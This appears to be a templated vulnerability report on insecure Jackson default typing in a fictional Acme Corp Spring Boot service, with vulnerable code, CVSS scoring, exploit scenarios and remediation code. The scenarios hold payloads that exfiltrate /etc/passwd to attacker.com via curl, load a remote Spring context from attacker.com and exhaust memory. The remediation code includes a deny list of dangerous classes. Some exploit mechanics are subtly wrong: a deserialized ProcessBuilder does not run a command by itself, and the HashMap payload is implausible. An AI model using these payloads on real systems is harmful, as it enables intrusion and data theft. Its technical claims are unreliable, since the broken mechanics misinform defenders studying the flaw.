# Jackson Insecure Deserialization via Default Typing

# Vulnerability Case
During our assessment of Acme Corp's Java-based microservices, we discovered a critical deserialization vulnerability in one of its Spring Boot applications that leverages the Jackson library for JSON processing. The application was configured to enable default typing globally, allowing polymorphic type handling without sufficient validation. This flaw was identified during a code review and dynamic testing phase where untrusted JSON data was deserialized into generic objects, thereby exposing the system to potential remote code execution (RCE) attacks. The issue is of particular concern given that the vulnerable stack includes Java 11, Spring Boot, and Jackson 2.9.x, technologies commonly deployed in enterprise environments.

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.impl.LaissezFaireSubTypeValidator;

public class VulnerableDeserialization {
  public static void main(String[] args) throws Exception {
    // Initialize ObjectMapper with default typing enabled
    // WARNING: Enabling default typing in this manner is unsafe for attacker-controlled JSON.
    ObjectMapper mapper = new ObjectMapper();
    mapper.activateDefaultTyping(
        LaissezFaireSubTypeValidator.instance,
        ObjectMapper.DefaultTyping.NON_FINAL
    );

    // Simulate reading untrusted JSON input (e.g., from an API request)
    String inputJson = args[0]; // attacker-controlled $JSON
    Object deserializedObject = mapper.readValue(inputJson, Object.class);
    System.out.println("Deserialized object: " + deserializedObject);
  }
}
```

The vulnerability arises from Jackson's default typing being enabled, which permits the JSON payload to embed fully qualified class names and type information. An attacker who controls the JSON input `$JSON` can craft a malicious payload that specifies a dangerous or unexpected type, leading Jackson to instantiate classes during deserialization with unintended side effects. This behavior may be exploited to achieve remote code execution (RCE) or bypass application security controls. In a real-world context using Java 11, Spring Boot, and Jackson 2.9.x, such an exploit could allow attackers to pivot within the corporate network, access sensitive data, or disrupt business operations significantly.


context: java.lang.security.jackson-unsafe-deserialization.jackson-unsafe-deserialization When using Jackson to marshall/unmarshall JSON to Java objects, enabling default typing is dangerous and can lead to RCE. If an attacker can control `$JSON` it might be possible to provide a malicious JSON which can be used to exploit unsecure deserialization. In order to prevent this issue, avoid to enable default typing (globally or by using "Per-class" annotations) and avoid using `Object` and other dangerous types for member variable declaration which creating classes for Jackson based deserialization.

# Vulnerability Breakdown
This vulnerability involves the insecure configuration of Jackson's default typing feature in a Spring Boot application, creating a serious remote code execution risk.

1. **Key vulnerability elements**:
   - Global activation of Jackson's default typing using `activateDefaultTyping()` with `NON_FINAL` setting
   - Deserialization of untrusted JSON directly into `Object.class`
   - LaissezFaireSubTypeValidator usage which provides minimal type validation
   - External input directly passed to deserialization without validation
   - Running on legacy Jackson 2.9.x with known deserialization vulnerabilities

2. **Potential attack vectors**:
   - Crafting malicious JSON payloads that specify dangerous Java classes
   - Leveraging Java gadget chains available in the application classpath
   - Exploiting known Jackson deserialization vulnerabilities targeting specific class patterns
   - Passing specially crafted payloads to API endpoints that use this deserialization mechanism

3. **Severity assessment**:
   - Critical severity due to potential remote code execution (RCE)
   - Network-accessible attack vector with high complexity
   - No special privileges or user interaction required
   - Complete compromise of confidentiality, integrity, and availability possible
   - Scope potentially extends to the entire host system

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): High (H) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): None (N) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): High (H) 
   - Availability (A): High (H) 

# Description
A critical insecure deserialization vulnerability exists in Acme Corp's Java-based microservices, specifically in a Spring Boot application using Jackson 2.9.x for JSON processing. The application enables Jackson's default typing globally without proper validation constraints, allowing polymorphic type handling for untrusted input. This configuration permits deserialization of arbitrary Java classes specified in JSON payloads.

```java
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(
    LaissezFaireSubTypeValidator.instance,
    ObjectMapper.DefaultTyping.NON_FINAL
);

// Untrusted JSON input directly deserialized to Object.class
Object deserializedObject = mapper.readValue(inputJson, Object.class);

```

This vulnerability allows attackers to craft malicious JSON payloads that leverage Java gadget chains present in the application's classpath, potentially leading to remote code execution (RCE), data exfiltration, or denial of service. The issue is especially critical because the application accepts external input without validation and uses a permissive subtype validator (`LaissezFaireSubTypeValidator`).

# CVSS
**Score**: 8.1 \
**Vector**: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H \
**Severity**: High

The High severity rating (8.1) is justified by the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability can be exploited remotely through any endpoint accepting JSON input, making it accessible to unauthenticated attackers over the internet

- **High Attack Complexity (AC:H)**: Exploitation requires significant preparation and specialized knowledge. An attacker must have detailed understanding of Java deserialization, Jackson-specific payload crafting, and knowledge of available gadget chains in the application's classpath. The attacker must:
  - Identify viable gadget chains present in the target application
  - Craft precisely formatted JSON payloads that trigger these chains
  - Bypass any application-specific constraints or filters
  - Potentially deal with classpath limitations or security mechanisms
  - Handle various runtime environmental factors that affect exploitation

- **No Privileges Required (PR:N)**: An attacker doesn't need any authentication or authorization to exploit the vulnerability if they can reach an endpoint that uses the vulnerable deserialization logic

- **No User Interaction (UI:N)**: The vulnerability can be exploited entirely through API calls without requiring any action from legitimate users

- **Unchanged Scope (S:U)**: While the impact is severe, the vulnerability doesn't inherently allow crossing privilege boundaries beyond those of the application itself

- **High Confidentiality Impact (C:H)**: Successful exploitation could allow complete access to all data processed by the application, including sensitive information and credentials

- **High Integrity Impact (I:H)**: An attacker could modify or delete application data, inject fraudulent information, or tamper with application logic

- **High Availability Impact (A:H)**: Remote code execution could be used to crash the service, consume system resources, or make the application completely unavailable

While the potential impact is extensive, the high complexity of crafting and successfully executing exploit payloads reduces the overall score from Critical to High.

# Exploitation Scenarios
**Scenario 1: Remote Code Execution via JDK Gadgets**
An attacker identifies an API endpoint in the vulnerable microservice that accepts JSON data. They craft a malicious payload using the Jackson polymorphic typing feature to instantiate dangerous JDK classes like `java.lang.ProcessBuilder`. By constructing a chain of nested objects, they can trigger command execution on the server:

```json
["java.lang.ProcessBuilder", ["bash", "-c", "curl -d \"$(cat /etc/passwd)\" https://attacker.com/exfil"]]

```

When this payload is deserialized, it executes the specified command, exfiltrating sensitive system information to the attacker's server.

**Scenario 2: Data Exfiltration via Property Access**
The attacker targets internal data by crafting a payload that leverages Java Beans property access patterns. They create a JSON structure that instantiates a class with access to sensitive configuration:

```json
["org.springframework.context.support.ClassPathXmlApplicationContext", "https://attacker.com/malicious-context.xml"]

```

This payload loads a malicious Spring context definition from the attacker's server, which can be configured to expose internal application data, environment variables, or database credentials.

**Scenario 3: Denial of Service via Resource Exhaustion**
The attacker crafts a payload designed to consume excessive system resources:

```json
["java.util.HashMap", {"f":1, "b":"x", "threshold":0.75, "loadFactor":0.75, "size":2147483647}]

```

This attempt to create an enormously sized HashMap consumes available memory on the application server, causing severe performance degradation or complete service outage for all users.

# Impact Analysis
**Business Impact:**
- Unauthorized access to sensitive customer and business data stored or processed by the application
- Potential breach of regulated information (PII, PHI, financial data) leading to compliance violations
- Financial impact from breach reporting, remediation costs, and potential regulatory fines
- Reputational damage if breaches are disclosed or service disruptions occur
- Legal liability from affected customers or partners
- Business continuity risks if critical services are compromised or disrupted
- Intellectual property theft if proprietary algorithms or business logic is exposed

**Technical Impact:**
- Remote code execution allowing attackers to run arbitrary commands with the privileges of the application
- Complete application compromise including unauthorized read/write access to all data
- Potential access to internal network resources if the application has access to other systems
- Data theft, manipulation, or destruction affecting application integrity
- Ability to establish persistence through backdoors, scheduled tasks, or other mechanisms
- Lateral movement to other systems within the network infrastructure
- Authentication bypass by accessing or modifying credential stores
- Logging and monitoring evasion by manipulating application logs
- Denial of service affecting availability of critical business functions

# Technical Details
The vulnerability stems from an insecure configuration of Jackson's polymorphic type handling capabilities. Let's examine the core technical issues:

```java
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(
    LaissezFaireSubTypeValidator.instance,
    ObjectMapper.DefaultTyping.NON_FINAL
);

String inputJson = args[0]; // attacker-controlled JSON
Object deserializedObject = mapper.readValue(inputJson, Object.class);

```

**Vulnerability Mechanics:**

1. **Default Typing Activation**: The call to `activateDefaultTyping()` configures Jackson to process type information embedded in JSON. This allows the JSON to specify which Java class should be instantiated during deserialization.

2. **LaissezFaireSubTypeValidator**: This validator imposes minimal restrictions on which classes can be deserialized. As its name suggests ("laissez-faire" meaning minimal interference), it permits most classes to be deserialized.

3. **DefaultTyping.NON_FINAL**: This setting applies polymorphic type handling to all non-final types, which includes nearly all standard JDK classes and most application classes.

4. **Deserialization to Object.class**: Using `Object.class` as the target type provides maximum flexibility in what can be deserialized, allowing any class permitted by the validator.

5. **Untrusted Input**: The application directly processes external input (`args[0]`) without validation.

**Exploitation Process:**

When default typing is enabled, Jackson accepts JSON payloads that specify the Java class to instantiate. A typical malicious payload structure is:

```json
["com.dangerous.ClassToInstantiate", {"constructorParam1": "value1", "constructorParam2": "value2"}]

```

Jackson processes this by:
1. Reading the class name from the first element
2. Attempting to load the specified class via reflection
3. Creating an instance of that class
4. Populating the object's properties with the values from the second element

**Gadget Chains:**

Attackers typically leverage "gadget chains" - sequences of method calls triggered during deserialization that lead to harmful operations. Common gadget chains in Java applications include:

1. **JDK Gadgets**: Classes like `java.lang.ProcessBuilder` that can execute system commands
2. **Spring Gadgets**: Classes like `org.springframework.context.support.ClassPathXmlApplicationContext` that can load arbitrary XML
3. **JNDI Gadgets**: Classes that perform JNDI lookups, potentially fetching malicious objects

**Jackson 2.9.x Specific Issues:**

This version predates several security enhancements added in later Jackson versions. Specific issues include:

1. Less restrictive default blocklists for dangerous classes
2. Incomplete protection against certain exploitation techniques
3. Vulnerability to several documented CVEs related to deserialization

**Real-World Exploitation Factors:**

1. **Classpath Availability**: Successful exploitation requires the target gadget classes to be available in the application's classpath
2. **Security Manager**: Absence of a Java Security Manager increases risk
3. **Network Access**: Internal network access from the application increases impact
4. **Container Isolation**: Weak container isolation increases the blast radius

# Remediation Steps
## Disable Default Typing

**Priority**: P0

Immediately remove the global default typing configuration to prevent polymorphic type handling for untrusted data:

```java
// REMOVE this vulnerable configuration
// mapper.activateDefaultTyping(
//     LaissezFaireSubTypeValidator.instance,
//     ObjectMapper.DefaultTyping.NON_FINAL
// );

// Instead, use a simple ObjectMapper without default typing
ObjectMapper mapper = new ObjectMapper();

// For cases where you need to deserialize polymorphic types,
// use explicit type information via annotations on trusted classes rather than
// enabling default typing globally

```

This change eliminates the root cause by preventing Jackson from instantiating arbitrary classes specified in JSON payloads. After this change, Jackson will only deserialize to explicitly specified types without accepting type information from the JSON itself.
## Implement Strict Type Validation

**Priority**: P1

If polymorphic typing is absolutely required for the application's functionality, implement strict class validation:

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;

public class SecureDeserialization {
    public static ObjectMapper createSecureMapper() {
        // Create a validator that only allows specific packages/classes
        BasicPolymorphicTypeValidator validator = BasicPolymorphicTypeValidator.builder()
            // Only allow classes from your trusted packages
            .allowIfBaseType("com.acmecorp.trusted")
            .allowIfSubType("com.acmecorp.trusted")
            // Explicitly deny dangerous packages
            .denyForExactBaseType("java.lang.Object")
            .denyForExactBaseType("java.lang.Runtime")
            .denyForExactBaseType("java.lang.ProcessBuilder")
            .denyForExactBaseType("javax.naming.InitialContext")
            .build();
            
        // Configure Jackson with the strict validator
        ObjectMapper mapper = new ObjectMapper();
        mapper.activateDefaultTyping(validator, ObjectMapper.DefaultTyping.NON_FINAL);
        return mapper;
    }
    
    public static void main(String[] args) throws Exception {
        ObjectMapper secureMapper = createSecureMapper();
        
        try {
            // Validate input before deserialization (additional security layer)
            validateJsonInput(args[0]);
            
            // Use explicit type instead of Object.class when possible
            MyTrustedClass result = secureMapper.readValue(args[0], MyTrustedClass.class);
            System.out.println("Safely deserialized: " + result);
        } catch (Exception e) {
            System.err.println("Deserialization error: " + e.getMessage());
            // Log the error, but don't expose exception details to clients
        }
    }
    
    private static void validateJsonInput(String json) {
        // Implement input validation logic
        // Check size, structure, character set, etc.
    }
}

```

This approach implements defense-in-depth by:
1. Creating a strict allow-list of permitted packages and classes
2. Explicitly denying known dangerous classes
3. Adding pre-deserialization validation
4. Using specific target types instead of Object.class where possible
5. Implementing proper error handling without information leakage


# References
* CWE-502 | [Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
* A08:2021 | [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* CWE-94 | [Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html)
